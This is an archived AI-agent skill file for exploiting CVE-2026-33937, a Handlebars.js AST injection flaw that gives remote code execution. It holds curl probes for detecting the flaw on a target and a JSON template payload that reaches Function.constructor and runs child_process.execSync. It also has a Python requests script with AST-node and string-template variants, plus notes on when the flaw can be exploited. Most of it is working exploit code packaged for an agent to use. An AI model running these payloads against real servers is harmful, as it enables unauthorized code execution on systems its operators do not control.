<!-- archived from /root/.hermes/skills/security/handlebars-ast-injection-rce/SKILL.md on 2026-10-21 -->

---
name: handlebars-ast-injection-rce
description: "Use when Handlebars.js templates. AST inject RCE."
---

> 归档卡：原目录 `/root/.hermes/skills/security/handlebars-ast-injection-rce`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/handlebars-ast-injection-rce/…')`，不要相对 `references/legacy/` 解析。

# CVE-2026-33937 Handlebars.js AST Injection → RCE

## Overview
Handlebars.js < 4.7.9. When user input is compiled as a template (not just rendered as data), an attacker can inject AST nodes that bypass the sandbox and reach `Function.constructor` for arbitrary code execution.

## Detection
```bash
# Test for template compilation (vs safe rendering)
curl <TARGET>/api/render -d '{"template":"{{this}}"}' -H 'Content-Type: application/json'
# If it renders = templates are compiled from user input

# Canary: prototype access
curl <TARGET>/api/render -d '{"template":"{{constructor.constructor}}"}'  -H 'Content-Type: application/json'
# Returns 'function Function()' = vulnerable
```

## Exploitation

### Payload
```json
{
  "template": "{{#with \"constructor\"}}{{#with (lookup (lookup this \"constructor\") \"constructor\")}}{{this \"return require('child_process').execSync('id').toString()\"}}{{/with}}{{/with}}"
}
```

### AST injection variant (bypasses string-level filters)
```python
import requests, json

TARGET = '<TARGET>'

# Inject a raw AST Program node
ast_payload = {
    'type': 'Program',
    'body': [{
        'type': 'MustacheStatement',
        'path': {
            'type': 'PathExpression',
            'parts': ['constructor', 'constructor'],
            'original': 'constructor.constructor'
        },
        'params': [{
            'type': 'StringLiteral',
            'value': "return require('child_process').execSync('id').toString()"
        }]
    }]
}

# If the app accepts pre-compiled AST:
requests.post(f'{TARGET}/api/render', json={'ast': ast_payload})

# If string template only:
requests.post(f'{TARGET}/api/render', json={
    'template': '{{#with "constructor"}}{{#with (lookup (lookup this "constructor") "constructor")}}{{this "return require(\'child_process\').execSync(\'id\').toString()"}}{{/with}}{{/with}}'
})
```

## Pitfalls
- Only exploitable if user input is **compiled** as template, not just passed as data context
- `handlebars.compile(userInput)` = vulnerable; `template({data: userInput})` = safe
- Some apps use `noEscape: true` which helps but doesn't prevent AST injection
- Lookup helper chain: `constructor.constructor` → `Function` → arbitrary code
- Source: EQSTLab/CVE-2026-33937
